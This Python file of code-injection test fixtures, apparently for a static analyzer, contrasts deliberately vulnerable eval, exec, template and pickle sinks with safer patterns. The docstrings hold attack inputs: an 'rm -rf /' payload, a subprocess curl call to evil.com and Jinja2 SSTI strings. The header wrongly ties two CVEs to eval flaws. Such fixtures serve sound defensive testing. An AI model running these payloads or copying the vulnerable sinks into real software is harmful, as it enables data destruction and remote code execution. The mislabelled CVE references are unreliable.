"""
Code Injection Test Fixtures

CWE-94: Code Injection
CVE-2014-1829: Python eval() RCE
CVE-2019-19844: Django eval() vulnerability
"""

import ast
import json

# ==================================================
# VULNERABLE: eval() (MOST DANGEROUS)
# ==================================================


def code_injection_vulnerable_1_eval(user_input: str):
    """
    ❌ CRITICAL: eval() with user input

    Real attack: user_input = "__import__('os').system('rm -rf /')"
    Result: Arbitrary code execution
    """
    # VULNERABLE: eval() executes any Python code
    result = eval(user_input)  # SINK: eval()
    return result


def code_injection_vulnerable_2_math_eval(expression: str):
    """
    ❌ CRITICAL: eval() for "safe" math

    Real attack: expression = "__import__('subprocess').call(['curl','evil.com'])"
    """
    # VULNERABLE: Even "math only" is dangerous
    result = eval(expression)  # SINK
    return result


def code_injection_vulnerable_3_json_eval(json_str: str):
    """
    ❌ CRITICAL: eval() instead of json.loads()
    """
    # VULNERABLE: Never use eval for JSON!
    data = eval(json_str)  # SINK
    return data


# ==================================================
# VULNERABLE: exec()
# ==================================================


def code_injection_vulnerable_4_exec(code: str):
    """
    ❌ CRITICAL: exec() with user code

    Real attack: code = "import os; os.system('whoami')"
    """
    # VULNERABLE: exec() runs arbitrary code
    exec(code)  # SINK: exec()


def code_injection_vulnerable_5_dynamic_function(func_body: str):
    """
    ❌ CRITICAL: Dynamic function creation
    """
    # VULNERABLE: Creating function from user input
    code = f"""
def dynamic_func():
    {func_body}
    """

    exec(code)  # SINK


# ==================================================
# VULNERABLE: compile()
# ==================================================


def code_injection_vulnerable_6_compile(source: str):
    """
    ❌ CRITICAL: compile() + exec()
    """
    # VULNERABLE: compile() creates code object
    code_obj = compile(source, "<string>", "exec")  # SINK: compile()
    exec(code_obj)


# ==================================================
# VULNERABLE: __import__()
# ==================================================


def code_injection_vulnerable_7_import(module_name: str):
    """
    ❌ CRITICAL: Dynamic import with user input

    Real attack: module_name = "os"
    Then: getattr(__import__('os'), 'system')('whoami')
    """
    # VULNERABLE: Dynamic import
    module = __import__(module_name)  # SINK: __import__()
    return module


# ==================================================
# VULNERABLE: Template injection
# ==================================================


def code_injection_vulnerable_8_template(template_str: str):
    """
    ❌ CRITICAL: Server-Side Template Injection (SSTI)

    Real attack: template_str = "{{ config.items() }}"
    Result: Exposes Flask config
    """
    from flask import render_template_string

    # VULNERABLE: SSTI
    return render_template_string(template_str)  # SINK


def code_injection_vulnerable_9_jinja2(user_template: str):
    """
    ❌ CRITICAL: Jinja2 template injection

    Real attack: "{{ ''.__class__.__mro__[1].__subclasses__() }}"
    Result: Access to all Python classes
    """
    from jinja2 import Template

    # VULNERABLE
    template = Template(user_template)
    return template.render()  # SINK


# ==================================================
# VULNERABLE: Pickle (code execution)
# ==================================================


def code_injection_vulnerable_10_pickle(data: bytes):
    """
    ❌ CRITICAL: pickle.loads() allows code execution

    See: insecure_deserialize.py for details
    """
    import pickle

    # VULNERABLE: pickle can execute code
    obj = pickle.loads(data)  # SINK
    return obj


# ==================================================
# SAFE: ast.literal_eval() (BEST PRACTICE)
# ==================================================


def code_injection_safe_1_literal_eval(user_input: str):
    """
    ✅ SECURE: ast.literal_eval() for safe evaluation

    Only allows: strings, bytes, numbers, tuples, lists, dicts, sets, booleans, None
    """
    # SAFE: Only literal structures
    try:
        result = ast.literal_eval(user_input)
        return result
    except (ValueError, SyntaxError):
        raise ValueError("Invalid literal")


def code_injection_safe_2_math_parser(expression: str):
    """
    ✅ SECURE: Safe math expression parser
    """
    import ast
    import operator

    # Allowlist of safe operations
    SAFE_OPS = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv,
        ast.USub: operator.neg,
    }

    def eval_node(node):
        if isinstance(node, ast.Num):
            return node.n
        elif isinstance(node, ast.BinOp):
            left = eval_node(node.left)
            right = eval_node(node.right)
            op = SAFE_OPS.get(type(node.op))
            if op is None:
                raise ValueError("Unsafe operation")
            return op(left, right)
        elif isinstance(node, ast.UnaryOp):
            operand = eval_node(node.operand)
            op = SAFE_OPS.get(type(node.op))
            if op is None:
                raise ValueError("Unsafe operation")
            return op(operand)
        else:
            raise ValueError("Unsafe node type")

    # SAFE: Parse and validate AST
    tree = ast.parse(expression, mode="eval")
    return eval_node(tree.body)


# ==================================================
# SAFE: JSON parsing
# ==================================================


def code_injection_safe_3_json(json_str: str):
    """
    ✅ SECURE: Use json.loads() not eval()
    """
    # SAFE: JSON parser
    data = json.loads(json_str)
    return data


# ==================================================
# SAFE: Restricted execution (Python 2 style)
# ==================================================


def code_injection_safe_4_restricted_globals(expression: str):
    """
    ✅ SECURE: eval() with restricted globals

    Note: Not 100% safe, prefer ast.literal_eval()
    """
    # SAFE: Restricted namespace
    safe_dict = {
        "__builtins__": {},
        "abs": abs,
        "min": min,
        "max": max,
    }

    # Only allow safe functions
    result = eval(expression, safe_dict, {})
    return result


# ==================================================
# SAFE: Sandboxed execution
# ==================================================


def code_injection_safe_5_sandbox(code: str):
    """
    ✅ SECURE: Sandboxed code execution

    Use external sandbox like: PyPy sandbox, RestrictedPython, etc.
    """
    from RestrictedPython import compile_restricted, safe_globals

    # SAFE: RestrictedPython sandbox
    byte_code = compile_restricted(code, "<string>", "exec")

    exec(byte_code, safe_globals)


# ==================================================
# SAFE: Allowlist validation
# ==================================================


def code_injection_safe_6_allowlist(operation: str, value: int):
    """
    ✅ SECURE: Allowlist of operations
    """
    # SAFE: Allowlist pattern
    ALLOWED_OPS = {
        "add": lambda x: x + 10,
        "subtract": lambda x: x - 10,
        "multiply": lambda x: x * 2,
    }

    if operation not in ALLOWED_OPS:
        raise ValueError("Invalid operation")

    return ALLOWED_OPS[operation](value)


def code_injection_safe_7_config_validation(config_key: str):
    """
    ✅ SECURE: Config key validation
    """
    # SAFE: Allowlist of config keys
    ALLOWED_KEYS = {"timeout", "max_retries", "debug"}

    if config_key not in ALLOWED_KEYS:
        raise ValueError("Invalid config key")

    return get_config(config_key)


# ==================================================
# SAFE: Template sandboxing
# ==================================================


def code_injection_safe_8_jinja2_sandbox(user_template: str):
    """
    ✅ SECURE: Jinja2 SandboxedEnvironment
    """
    from jinja2.sandbox import SandboxedEnvironment

    # SAFE: Sandboxed Jinja2
    env = SandboxedEnvironment()
    template = env.from_string(user_template)

    return template.render()


# ==================================================
# SAFE: Static templates only
# ==================================================


def code_injection_safe_9_static_template(data: dict):
    """
    ✅ SECURE: Use static templates, not user input
    """
    from flask import render_template

    # SAFE: Template path is static, only data varies
    return render_template("user_profile.html", **data)


# ==================================================
# Real-world patterns
# ==================================================


def code_injection_safe_10_calculator(expression: str) -> float:
    """
    ✅ SECURE: Safe calculator implementation
    """
    import re

    # Validate: only numbers and operators
    if not re.match(r"^[\d\s\+\-\*/\(\)\.]+$", expression):
        raise ValueError("Invalid expression")

    # Use safe math parser
    return code_injection_safe_2_math_parser(expression)


# Helper
def get_config(key: str):
    """Mock config getter"""
    return {"timeout": 30, "max_retries": 3, "debug": False}.get(key)
